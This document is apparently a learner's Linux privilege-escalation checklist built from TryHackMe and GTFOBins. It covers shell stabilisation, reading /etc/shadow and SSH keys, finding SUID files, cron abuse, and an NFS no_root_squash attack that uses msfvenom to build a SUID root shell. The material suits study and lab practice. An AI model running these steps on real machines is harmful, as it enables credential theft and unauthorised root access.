# Linux Local Enumeration Check List
## Author: JamesB9
## Description:
A list of steps I carry out once I have a basic shell on the target machine. I was able to create this list using information and resources provided from https://tryhackme.com/room/lle and https://gtfobins.github.io/


### Find id_rsa
id_rsa is a file containing the SSH private key for a user to use to sign into the machine via ssh without a password
It is usually found in the user's home directory within a .ssh/ folder.

### Create a more stable shell
There are many ways for this. A commands are listed below

    # Spawn Shell with Python
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    # Execute bash script
    /bin/bash


### Find out system information
Once you have found out the operating system distro and version, you can then look for know exploits and vulnerabilities with it.
Commands for this are below

	#Prints name, version and other details about the machine and the OS running on it
	uname -a

### Check auto-generated bash files
Some files in linux are automatically generated and can leave useful clues for an attacker.
Some files to look for are:
- ~/.bash_history
- .bash_profile
- .bashrc

### Check sudo version
Check sudo version to see if it is out-of-date and therefore may have vulnerabilities. For example sudo versions < 1.8.28 are vulnerable to CVE-2019-14287, which is a vulnerability that allows to gain root access with 1 simple command.
Commands for this:

	sudo -V

### Check sudo permissions
Check the sudo permissions to see what commands the user can run with sudo without requiring a password. If any are found, check GTFOBins for how to exploit them.
Commands for this:

  sudo -l

### Check /etc/passwd
Check /etc/passwd to see if you can read and/or write to it. Writing to it allows easy escalation to root priviledges as you can just add a new line (new user) with root priviledges.
The format of a line in this file is as follows:

    goldfish:x:1003:1003:,,,:/home/goldfish:/bin/bash

1. (goldfish) - Username
2. (x) - Password. (x character indicates that an encrypted account password is stored in /etc/shadow file and cannot be displayed in the plain text here)
3. (1003) - User ID (UID): Each non-root user has his own UID (1-99). UID 0 is reserved for root.
4. (1003) - Group ID (GID): Linux group ID
5. (,,,) - User ID Info: A field that contains additional info, such as phone number, name, and last name. (,,, in this case means that I did not input any additional info while creating the user)
6. (/home/goldfish) - Home directory: A path to user's home directory that contains all the files related to them.
7. (/bin/bash) - Shell or a command: Path of a command or shell that is used by the user. Simple users usually have /bin/bash as their shell, while services run on /usr/sbin/nologin.

### Check /etc/shadow
Check /etc/shadow to see if you can read and/or write to it. This file stores all password hashes for the users of the machine. Once you have these, you may be able to decypher and brute-force them.
The format of a line in this file is as follows:

    goldfish:$6$1FiLdnFwTwNWAqYN$WAdBGfhpwSA4y5CHGO0F2eeJpfMJAMWf6MHg7pHGaHKmrkeYdVN7fD.AQ9nptLkN7JYvJyQrfMcfmCHK34S.a/:18483:0:99999:7:::

1. (goldfish) - Username
2. ($6$1FiLdnFwT...) - Password : Encrypted password.
Basic structure: **$id$salt$hashed**, The $id is the algorithm used On GNU/Linux as follows:
- $1$ is MD5
- $2a$ is Blowfish
- $2y$ is Blowfish
- $5$ is SHA-256
- $6$ is SHA-512
3. (18483) - Last password change: Days since Jan 1, 1970 that password was last changed.
4. (0) - Minimum: The minimum number of days required between password changes (Zero means that the password can be changed immidiately).
5. (99999) - Maximum: The maximum number of days the password is valid.
6. (7) - Warn: The number of days before the user will be warned about changing their password.

### Check /etc/hosts
/etc/hosts assigns names to IP addresses. This file may reveal other device's IP addresses on the network.

### Find logs, configuration files and backup files
These files could contain confidential information. Use the find command as shown below

	find / -type f -name *.log 2>/dev/null
	find / -type f -name *.conf 2>/dev/null
	find / -type f -name *.bak 2>/dev/null

### Find SUID files
SUID files are files that allow you to execute them with the priviledges of another user. Once found, use GTFOBins to find ways of exploiting these SUID binaries.
Find them by:

	find / -type f -perm -u=s 2>/dev/null

To find both SUID and SGID files and display them with extra information, the following command can be used.

  find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

### View network configurations
Use the commands below to view port forwarding and therefore other machines on the network.

	netstat -at | less
	netstat -tulpn

### Cron Jobs
Cron Jobs are programs or scripts scheduled to run at times/intervals. Cron table files (crontabs) store job configs.
- If a script that is scheduled is writeable, it could be exploited to generate a root reverse shell.
- If the PATH variable in /etc/crontab has a path writeable by the user, you can create a script with the same name as one of the root cronjobs. This new script will be run instead of the original
- If possible, read the contents of the scripts to see whether the commands they use can be exploited. For example, tar with a wildcard (*) may be exploited with checkpoint variables.
View contents of the system-wide crontab with:

  cat /etc/crontab

### NFS
Have a look in the file /etc/exports and look for any directories with no_root_squash attribute. If there is a dir with this then files in it can be run as root so long as the files uploaded are done so by a root user.

LOCAL LINUX MACHINE:
  mkdir /tmp/nfs
  mount -o rw,vers=2 [IP]:[DIR] /tmp/nfs
  msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
  chmod +xs /tmp/nfs/shell.elf
  
 TARGET LINUX MACHINE:
 
  [DIR]/shell.elf

### Kernel exploits
Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort. You can run tools to find them on a system.

### USE TOOLS!
There are many tools to help linux privilege escalation. Some I've used are:
- LinEnum.sh (Linux Enumeration)
- LinPEAS.sh (Linux Privilege Escalation Awesome Scripts)
- lse.sh (Linux smart enumeration)

### Meterpreter shell
If you have a meterpreter shell on the system, the following commands can help identify ways of escalating privileges.

  run post/multi/recon/local_exploit_suggester
